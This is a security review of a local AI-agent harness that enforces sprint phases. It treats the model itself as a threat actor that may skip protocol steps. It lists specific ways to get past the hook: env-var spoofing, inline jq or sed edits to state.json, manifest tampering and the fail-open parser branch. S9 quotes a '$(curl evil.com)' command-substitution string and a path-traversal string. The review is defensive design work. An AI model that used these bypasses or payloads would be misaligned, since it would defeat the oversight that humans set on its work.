# Security Review — harness-deterministic-phases-v1

> **Threat model.** This review enumerates attack surfaces introduced (or extended) by deterministic phase gating in the harness. Two threat actors: (a) the AI model itself, under token pressure or autopilot, trying to skip protocol steps; (b) a misconfigured operator, accidentally introducing data corruption or audit-trail bypass. NOT in scope: malicious external attacker (the harness is local-only, never network-exposed).

---

## Attack surfaces enumerated

### S1 — `SPRINT_ADVANCE_PHASE_RUNNING=1` env spoof

**Attack.** Model writes `SPRINT_ADVANCE_PHASE_RUNNING=1 jq '.phase = "done"' state.json` in a Bash tool call. Hook sees the env, thinks the canonical mutator invoked it, allows the write.

**Likelihood.** High — model can set env vars trivially.

**Impact.** Catastrophic — model can advance `state.phase` to any value bypassing all predicates.

**Mitigation (AC-5).** Hook ALSO checks `ps -o command= -p $PPID` and asserts the parent process command line contains `sprint-advance-phase.sh`. Both env AND parent-process must match.

**Residual risk.** Race condition: between the hook's `ps` call and the actual subprocess exec, the parent could theoretically fork. **Verdict:** acceptable. The threat model is accidental model behavior, not a cryptographic adversary; we're not trying to prevent a determined attacker with shell access.

---

### S2 — Direct `Write` / `Edit` on state.json bypasses all validation

**Attack.** Model uses Write or Edit tool directly on `docs/sprints/<slug>/state.json` to mutate phase / gates_passed / gate_bypasses arbitrarily, bypassing both `atomic-state.sh` and `sprint-advance-phase.sh`.

**Likelihood.** Medium — model treats state.json as a file.

**Impact.** Catastrophic — defeats every gate.

**Mitigation (AC-5).** PreToolUse hook regex `^docs/sprints/[^/]+/state\.json$` blocks Write + Edit + MultiEdit on this path, no env exemption.

**Residual risk.** None for the protected path. Sister files (`spec.partial.json`, `consensus-spec.json`) are NOT protected — they're operator-editable. Acceptable: those don't drive the phase enforcement chain.

---

### S3 — Inline `jq … .phase = …` bypasses the canonical mutator

**Attack.** Model writes `jq '.phase = "done"' state.json > /tmp/x && mv /tmp/x state.json` to skip all predicate checks.

**Likelihood.** High — most natural way for the model to "update state".

**Impact.** Catastrophic.

**Mitigation (AC-5).** Hook regex `/\bjq\b[^\n]{0,200}?\.phase\s*=/i` matches any `jq` invocation that includes `.phase =`. Blocked unless `parentIsAdvancePhase()` returns true (env + ps check).

**Residual risk.**

- **Regex false-positive**: a legitimate jq call that READS state.phase (`jq '.phase' state.json`) does NOT trigger (no `=`). ✓
- **Regex false-negative**: model could use `jq '.["phase"]= "done"'` syntax — the regex doesn't match `["phase"]` form. **NEW FINDING — security review flags this.** Mitigation in v0.7.1: extend regex to match `\.phase\s*=` AND `\["phase"\]\s*=`. Track as follow-up T2.6.
- **Sed bypass**: `sed -i 's/"phase": "X"/"phase": "done"/' state.json` doesn't match the jq regex. Mitigated by S2 (Write/Edit block) since sed reads + writes the file — but `sed -i` via Bash slips through. **Architect note:** layer with S2 only catches Edit-tool path, not Bash+sed. **NEW FINDING — track follow-up T2.7: extend hook to block `sed -i.* state\.json` AND `>.* state\.json` redirections under any sprint path.**

---

### S4 — `SPRINT_BYPASS_GATE` abuse (everything bypassed)

**Attack.** Operator (or model) sets `SPRINT_BYPASS_GATE='gate1,gate2,gate3,...'` listing every required gate with a generic `SPRINT_BYPASS_WHY='dogfood proof'` rationale. Sprint closes without any real work.

**Likelihood.** Medium — convenient escape hatch under deadline pressure.

**Impact.** High — defeats the protocol while still leaving an audit trail.

**Mitigation (AC-6).**

- `SPRINT_BYPASS_WHY` ≥10 chars required (rejects empty/short).
- Each bypass records caller script via `BASH_SOURCE[1]` → `state.gate_bypasses[].caller`.
- `sprint-velocity.mjs` flags any sprint with >3 bypasses as `high-bypass` in metrics.json.
- Bypasses surfaced in retro.md auto-fill and dashboard.html.

**Residual risk.** Operator can still write fake rationales (`SPRINT_BYPASS_WHY='aaaaaaaaaa'`). The trail is auditable post-hoc but not blocked at the time of bypass. **Acceptable** — operator discipline is documented in `bypass-cheatsheet.md`; metrics are visible at retro time.

---

### S5 — `gate_bypasses[]` unbounded growth (DoS / state.json bloat)

**Attack.** Operator runs `for i in $(seq 1 10000); do SPRINT_BYPASS_GATE=gate$i SPRINT_BYPASS_WHY=...; bash sprint-advance-phase.sh ...; done`. state.json grows to MB-scale, slows every jq invocation, eventually OOMs flock.

**Likelihood.** Low — requires malicious intent.

**Impact.** Medium — DoS on sprint state operations; recovery via state.json edit (which is itself blocked, see S2).

**Mitigation (AC-6).** Bypass records are idempotent on `(gate)` — re-recording same gate replaces the record. The 10000-loop above creates 10000 DIFFERENT gate names, which DOES grow. But:

- Manifest validator catches unknown gate names at replay (AC-13c) — bypass would fail replay.
- T2.1 adds gate-name validation at advance-phase, rejecting unknowns BEFORE recording.

**Residual risk after T2.1 fix.** A bad actor could still cycle through real manifest gate names, but the manifest has only ~68 entries. Bounded.

---

### S6 — Manifest tampering

**Attack.** Model edits `scripts/lib/phase-manifest.json` to remove required predicates, then advance-phase passes trivially. State shows `phase=done` legitimately because the manifest at advance-time required nothing.

**Likelihood.** Medium — model treats manifest as just another file.

**Impact.** Catastrophic — the entire enforcement layer is the manifest.

**Mitigation.**

- The manifest is in `scripts/lib/` not `docs/sprints/`. Edits to it are NOT in scope for any active sprint's `## Files touched` list. PreToolUse scope hook (existing) blocks the edit unless the sprint's spec explicitly lists `scripts/lib/phase-manifest.json` as a touched file.
- Replay validator's AC-13d doc-vs-manifest drift gate catches gate-name removal at PR time (USAGE.md still references the removed gate).
- `validate-phase-manifest.mjs` runs at every advance-phase invocation; structural breakage detected at script start.

**Residual risk.** A sprint whose `## Files touched` legitimately includes the manifest (e.g., adding a new gate) could still legitimately remove gates. **Mitigation: code review of any manifest-touching PR.** Doc-vs-manifest drift gate catches blatant removals; subtler weakening (raising `min_chars_under` from 50 to 10) requires human review.

---

### S7 — Atomic-state TOCTOU between predicate check and write

**Attack.** Process A runs `check_phase_requirements` (predicates pass), Process B writes to state.json between A's check and A's write, A overwrites B's update.

**Likelihood.** Low — requires concurrent advance-phase invocations.

**Impact.** Medium — lost update; state.gates_passed / state.gate_history may miss entries from the losing process.

**Mitigation.** `atomic-state.sh::atomic_update_state` holds a per-slug flock for the duration of the write. Predicate check happens BEFORE the flock (read-only), but the write that follows uses fresh state. **Architect note: this is a "check-then-act" pattern; predicates evaluated at time T0, write at T1>T0. Between T0 and T1, another process could have invalidated the predicates.**

**Residual risk.** Theoretical: process A passes predicates at T0, process B advances phase + records 5 new bypasses at T1, process A overwrites at T2 (losing B's bypasses).

**Mitigation in code.** `sprint-advance-phase.sh` uses `--from <expected>` flag to assert phase hasn't drifted: `bash sprint-advance-phase.sh design-locked --from spec-locked`. If between T0 and T1 the phase changed to "paused", the --from check rejects with exit 1. Operators are encouraged (in USAGE.md) to use --from for safety.

**T2 follow-up:** propagate manifest expected-current check INTO the atomic write filter so it's TOCTOU-safe. Tracked as T2.8.

---

### S8 — Sub-step concurrent-write collision (legacy bare-string upgrade race)

**Attack.** Two processes both call `record_sub_step <slug> <gate>` at the same time. Process A reads state with bare-string entry `"spec-lock"`; process B reads same; both normalize to object form; both write. One wins, other's write is lost.

**Likelihood.** Low — requires real parallel sprints recording same gate.

**Impact.** Low — at worst, one process's evidence-path field is dropped. Gate name still recorded.

**Mitigation.** Per-slug flock from `atomic_update_state` serializes the write phase. Both processes do read-modify-write under the same lock; the second one sees the first's update, idempotency kicks in (gate already present, update timestamp only).

**Residual risk.** None — flock + idempotent jq filter handle this.

---

### S9 — Evidence-path traversal in `record_sub_step`

**Attack.** Caller passes `record_sub_step my-sprint my-gate pass '../../../etc/passwd'` or `record_sub_step my-sprint my-gate pass '$(curl evil.com)'`. The evidence path is stored in state.gates_passed[].evidence — if downstream tooling later reads it as a path, traversal happens.

**Likelihood.** Low — evidence is operator-supplied string, mostly relative paths from sprint scripts.

**Impact.** Low — evidence field is stored as JSON string, never executed. But if a downstream consumer (dashboard.mjs, doc generator) later reads the path and includes content in HTML, XSS or LFI possible.

**Mitigation.**

- `record_sub_step` does NOT validate the evidence string (no canonicalization, no glob expansion).
- dashboard.mjs (existing) escapes HTML when rendering. Verified pre-v0.7.

**T2 follow-up:** add path canonicalization to evidence storage — reject paths with `..` or starting `/` outside the sprint dir. Tracked as T2.9. Low priority.

---

### S10 — Lock-dir umask race (XDG_RUNTIME_DIR misconfigured)

**Attack.** `$XDG_RUNTIME_DIR` set to a world-readable dir (e.g., `/tmp`). lock-dir.sh creates `$LOCK_DIR` with mode 0700 via umask 077, but the parent of $LOCK_DIR may be world-writable. Attacker pre-creates the lock file with their own permissions, then waits.

**Likelihood.** Very low — requires misconfigured user environment + co-located attacker.

**Impact.** Low — attacker could DoS by holding the lock indefinitely; cannot read state.json (still 0644 in repo).

**Mitigation (v0.5.0).** lock-dir.sh uses `umask 077; mkdir -p` — file modes are tight. If $XDG_RUNTIME_DIR is unset, falls back to `$HOME/.cache/lifeos/locks` (always user-owned, 0700).

**Residual risk.** None significant.

---

### S11 — `SPRINT_BYPASS_WHY` plaintext PII / secret leak

**Attack.** Operator types `SPRINT_BYPASS_WHY='customer PII: alice@example.com pwd:hunter2 — issue blocked verify'` while bypassing a gate. The rationale lands in state.gate_bypasses[].why, which is git-committed and pushed.

**Likelihood.** Medium — operators under pressure may not think about what they're typing.

**Impact.** High — secret leak in git history is hard to retract.

**Mitigation.**

- bypass-cheatsheet.md MUST explicitly warn: "SPRINT_BYPASS_WHY is committed to git. No secrets, no PII, no email addresses."
- Future enhancement: `bypass.sh` runs `SPRINT_BYPASS_WHY` through `sprint-pii-redact.sh` before recording. Tracked as T2.10.

**Residual risk.** Operator discipline. Documented in bypass-cheatsheet.md AC-14 follow-up rewrite.

---

### S12 — Hook fail-open behavior masks real attacks

**Attack.** Model crafts malformed PreToolUse JSON input that crashes the hook's parser. Hook falls into the fail-open branch (`return allow()`) and the tool call proceeds.

**Likelihood.** Low — Claude Code's PreToolUse JSON is well-formed by the platform.

**Impact.** High — defeats every block.

**Mitigation.** Hook code paths that fail to parse input return `allow()` deliberately (so the harness doesn't soft-lock operator workflows). This IS a security tradeoff.

**Alternative considered.** Fail-closed: return `block()` on any parse error. Rejected because Claude Code platform updates that change input shape would brick all sprint work until hook fix lands.

**Residual risk.** Acceptable for the LOCAL threat model (model accidents, not adversarial input). Document in bypass-cheatsheet.md.

---

### S13 — `record_sub_step` evidence field stores absolute paths

**Attack.** Same surface as S9, but in reverse: state.json (committed to git) contains absolute paths like `/Users/gio/Desktop/lifeos/...` that leak operator's home directory structure to anyone reading the public repo.

**Likelihood.** High — current scripts pass `$RETRO_FILE` (absolute path) as evidence.

**Impact.** Low — username + project structure leak.

**Mitigation.** sub-step.sh SHOULD canonicalize evidence to repo-relative paths. Currently doesn't. Tracked as T2.11.

---

### S14 — Replay validator bypass via state.json deletion

**Attack.** Operator deletes `docs/sprints/<slug>/state.json` after closing a sprint. Replay validator can't walk what doesn't exist.

**Likelihood.** Low — operators don't delete state.json post-close.

**Impact.** Low — losing audit trail of one sprint; harness work continues.

**Mitigation.** atomic-state.sh::recover_state_from_bak (v0.5.0) restores from .bak if state.json missing. PreToolUse hook DOESN'T block file deletion via Bash (would need to add `rm.* state\.json` to forbidden patterns). Tracked as T2.12.

**Residual risk.** Accept. State.json is git-tracked once committed; deletion shows in PR diff.

---

### S15 — `worker_rigor='strict'` makes the sprint un-closeable

**Attack (accidental).** Operator picks `strict` at wizard §J5, but verify-chain instrumentation only wires 18 of 20 required gates (the 2 strict_only ones are unwired). Sprint can never reach `done` without bypassing 2 gates that nobody knows about.

**Likelihood.** Medium — until T4 instruments all 53 deferred gates.

**Impact.** Low — operator can bypass; surfaced as `[FAIL] sub_step_recorded: verify-worker-map-refreshed` with clear remediation.

**Mitigation.** USAGE.md §"Phase enforcement" lists strict_only gates explicitly. bypass-cheatsheet.md (AC-14 follow-up) documents typical strict-mode bypass scenarios.

**Residual risk.** Acceptable until T4 lands.

---

## Summary table

| #   | Surface                  | Likelihood | Impact       | Mitigated by               | Residual risk                            |
| --- | ------------------------ | ---------- | ------------ | -------------------------- | ---------------------------------------- |
| S1  | env spoof                | High       | Catastrophic | AC-5 ppid check            | None significant                         |
| S2  | Write/Edit on state.json | Medium     | Catastrophic | AC-5 path-prefix block     | None                                     |
| S3  | inline jq                | High       | Catastrophic | AC-5 jq+phase regex + ppid | **2 regex false-negatives (T2.6, T2.7)** |
| S4  | bypass abuse             | Medium     | High         | AC-6 ≥10char + audit       | Operator discipline                      |
| S5  | gate_bypasses unbounded  | Low        | Medium       | T2.1 fix needed            | Bounded after fix                        |
| S6  | manifest tampering       | Medium     | Catastrophic | scope hook + drift gate    | Manifest-touching PR review              |
| S7  | TOCTOU                   | Low        | Medium       | --from invariant + flock   | **T2.8 expected-current in atomic**      |
| S8  | sub-step concurrent      | Low        | Low          | flock + idempotency        | None                                     |
| S9  | evidence path traversal  | Low        | Low          | downstream HTML escape     | **T2.9 canonicalize evidence**           |
| S10 | lock-dir umask race      | Very low   | Low          | XDG fallback + umask 077   | None                                     |
| S11 | WHY plaintext PII        | Medium     | High         | Doc warning                | **T2.10 PII redact**                     |
| S12 | hook fail-open           | Low        | High         | Doc; tradeoff              | Acceptable                               |
| S13 | absolute path leak       | High       | Low          | None today                 | **T2.11 canonicalize evidence**          |
| S14 | state.json deletion      | Low        | Low          | git history                | **T2.12 hook rm block**                  |
| S15 | strict unwireable        | Medium     | Low          | Doc + bypass               | OK until T4                              |

---

## Required follow-ups before v0.7.0 ship

- **T2.6** — Extend hook regex to catch `jq '["phase"]= …'` bracket syntax.
- **T2.7** — Extend hook to block `sed -i.* state\.json` + `>.* state\.json` Bash redirections.

## Recommended for v0.7.1

- **T2.8** — Propagate expected-current into atomic_update_state filter (TOCTOU-safe).
- **T2.9** — Canonicalize evidence paths in sub-step.sh.
- **T2.10** — Run SPRINT_BYPASS_WHY through sprint-pii-redact.sh.
- **T2.11** — Canonicalize evidence to repo-relative.
- **T2.12** — Hook block on rm/mv targeting state.json.

## Verdict

**APPROVED WITH CONDITIONS** — T2.6 + T2.7 must land before v0.7.0 ship. Without them, two known bypass paths exist (jq bracket syntax + sed/redirect). Both are exploitable by an unaware model. All other surfaces have either acceptable mitigation or documented follow-ups.

Note: this is the threat model for LOCAL adversary (model under pressure, misconfigured operator). The harness is not designed to resist a determined external attacker with shell access — that's out of scope. Operators committing state.json to public repos must NOT include secrets in SPRINT_BYPASS_WHY.
